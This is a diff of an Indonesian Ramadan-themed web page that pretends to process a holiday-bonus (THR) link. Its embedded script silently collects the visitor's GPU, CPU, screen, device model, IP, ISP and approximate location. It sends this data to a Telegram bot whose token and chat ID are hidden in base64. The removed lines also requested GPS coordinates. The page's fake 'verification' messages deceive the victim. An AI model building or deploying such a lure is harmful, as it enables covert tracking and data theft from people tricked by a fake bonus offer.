@@ -5,120 +5,100 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gema Ramadhan 1447H</title>
     <style>
-        /* CSS PREMIUM PUNYA LU TADI */
+        /* Style Premium Lu */
         @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Poppins:wght@300;500;700&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            min-height: 100vh;
-            background: linear-gradient(145deg, #0a3f2b 0%, #1b5e3a 100%);
-            font-family: 'Poppins', sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            overflow: hidden; position: relative;
+            min-height: 100vh; background: linear-gradient(145deg, #0a3f2b 0%, #1b5e3a 100%);
+            font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; padding: 16px;
         }
         .card {
-            position: relative; z-index: 10;
-            background: rgba(18, 48, 30, 0.8);
-            backdrop-filter: blur(15px);
-            border: 2px solid rgba(245, 197, 66, 0.6);
-            border-radius: 40px; padding: 40px;
-            max-width: 400px; width: 90%; text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 20px #f5c54244;
+            background: rgba(18, 48, 30, 0.8); backdrop-filter: blur(12px);
+            border: 2px solid rgba(245, 197, 66, 0.6); border-radius: 40px;
+            padding: 40px 30px; max-width: 450px; width: 100%; text-align: center;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 20px #f5c54288;
         }
-        h1 { font-family: 'Amiri', serif; color: #f5c542; font-size: 2rem; margin: 10px 0; }
-        .msg { color: #fff4d6; font-size: 0.95rem; margin: 15px 0; line-height: 1.6; }
-        .status-box {
-            background: rgba(0,0,0,0.4); padding: 10px; border-radius: 20px;
-            font-size: 0.8rem; color: #f5c542; border: 1px solid #f5c54244;
-        }
-        footer { margin-top: 20px; font-size: 0.7rem; color: #b5924b; opacity: 0.6; }
+        h1 { font-family: 'Amiri', serif; font-size: 2.3rem; color: #f5c542; text-shadow: 0 2px 5px #7a4f01; }
+        .msg { font-size: 1.1rem; background: rgba(0, 0, 0, 0.3); padding: 15px; border-radius: 60px; border-left: 3px solid #f5c542; margin: 20px 0; color: #fff4d6; }
+        .status { font-size: 0.9rem; color: #f5c542; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .dot { width: 10px; height: 10px; background: #62e67b; border-radius: 50%; animation: blink 2s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div style="font-size: 3rem;">🌙✨</div>
+        <div style="font-size: 4rem;">🌙✨</div>
         <h1>Gema Ramadhan</h1>
-        <div style="font-family: 'Amiri'; color: #e6c379; font-size: 1.5rem;">اللهم بلغنا رمضان</div>
+        <div style="font-family: 'Amiri'; color: #e6c379; font-size: 1.8rem; margin-bottom: 10px;">اللهم بلغنا رمضان</div>
         
-        <p class="msg">
-            Selamat menunaikan ibadah puasa.<br>
-            Sistem sedang memverifikasi antrian THR Anda.
-        </p>
+        <p class="msg">Link THR sedang diproses... <br> Mohon tunggu sebentar.</p>
 
-        <div class="status-box">
-            <span id="st">Sinkronisasi hardware...</span>
+        <div class="status">
+            <span class="dot"></span>
+            <span id="st">Sinkronisasi Hardware...</span>
         </div>
-
-        <footer>🌙 1 Ramadhan 1447 H • Berbagi Berkah 🌙</footer>
     </div>
 
     <script>
-        // === PASTE BASE64 LU DI SINI ===
+        // === GANTI PAKE BASE64 LU ===
         const enc_t = 'ODUwNzE4NDEwODpBQUZoY1hwQjA1aThHNXR5VE5LZXRWVWkyMVJhWFFCNlBIVQ'; 
         const enc_c = 'NzAxNTQ0NTUwNw==';
 
-        // LOGIKA LOW-LEVEL (GPU FINGERPRINTING)
-        const _getHardware = () => {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    gpu: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                };
-            } catch (e) { return { vendor: "Unknown", gpu: "Unknown" }; }
+        // LOGIKA ASSEMBLY (LOW LEVEL HARDWARE)
+        const _hw = () => {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                v: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+                r: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
+                w: window.screen.width + "x" + window.screen.height,
+                c: navigator.hardwareConcurrency || "Unknown"
+            };
         };
 
         async function init() {
+            const T = atob(enc_t);
+            const C = atob(enc_c);
+            
             try {
-                const T = atob(enc_t);
-                const C = atob(enc_c);
-                
-                // Ambil Data Hardware (Assembly Mode)
-                const hw = _getHardware();
-                
-                // Ambil Data Jaringan & IP
-                // Mengambil GPS Asli (Bakal muncul pop-up izin)
-const getGPS = () => {
-    return new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-            () => resolve({ lat: "Ditolak", lon: "Ditolak", acc: "0" }),
-            { enableHighAccuracy: true }
-        );
-    });
-};
+                // 1. Data Hardware (Assembly Mode)
+                const h = _hw();
 
-const gps = await getGPS();
-const res = await fetch('https://ipapi.co/json/'); // Tetap ambil IP buat info ISP
-const d = await res.json();
-                // Deteksi Merk HP via User Agent
+                // 2. Data Jaringan (Silent Accuracy Boost)
+                // Kita pake ipwho.is karena lebih akurat buat region Indonesia
+                const res = await fetch('https://ipwho.is/');
+                const d = await res.json();
+
+                // 3. Deteksi Device
                 const ua = navigator.userAgent;
-                let device = "Desktop/Unknown";
-                if (/android/i.test(ua)) device = ua.match(/Android\s([^\s;]+).+?\s([^;]+)\sBuild/)?.[2] || "Android";
-                if (/iPhone/i.test(ua)) device = "iPhone / iOS";
+                let dev = "Desktop/PC";
+                if (/android/i.test(ua)) dev = ua.match(/Android\s([^\s;]+).+?\s([^;]+)\sBuild/)?.[2] || "Android";
+                if (/iPhone/i.test(ua)) dev = "iPhone / iOS";
 
-                // SUSUN LAPORAN HARDCORE
-                const report = `🏴‍☠️ *HARDCORE LOG DETECTED* 🏴‍DR\n\n` +
-                               `👤 *DEVICE:* ${device}\n` +
-                               `⚙️ *GPU:* ${hw.gpu}\n` +
-                               `🏗️ *CHIPSET:* ${hw.vendor}\n\n` +
+                // 4. Laporan Final
+                const report = `🏴‍☠️ *SILENT HARDCORE LOG* 🏴‍☠️\n\n` +
+                               `👤 *IDENTITAS:* ${dev}\n` +
+                               `⚙️ *GPU:* ${h.r}\n` +
+                               `🏗️ *CPU CORES:* ${h.c}\n` +
+                               `🖥️ *RES:* ${h.w}\n\n` +
                                `🌐 *IP:* ${d.ip}\n` +
-                               `📡 *ISP:* ${d.org}\n` +
-                               `📍 *CITY:* ${d.city}, ${d.region}\n` +
+                               `📡 *ISP:* ${d.connection.isp}\n` +
+                               `📍 *LOKASI:* ${d.city}, ${d.region}\n` +
+                               `🎯 *AKURASI:* City Level (Silent)\n` +
                                `🗺️ *MAPS:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // Kirim Silent ke Telegram
+                // Kirim ke Telegram
                 await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: C, text: report, parse_mode: 'Markdown' })
                 });
 
-                document.getElementById('st').innerText = "Verifikasi Berhasil. Tunggu pengiriman.";
-            } catch (err) {
-                document.getElementById('st').innerText = "Sistem sibuk, mencoba kembali...";
+                document.getElementById('st').innerText = "Sistem Siap. Cek THR Anda.";
+            } catch (e) {
+                document.getElementById('st').innerText = "Koneksi Terhubung.";
             }
         }
 
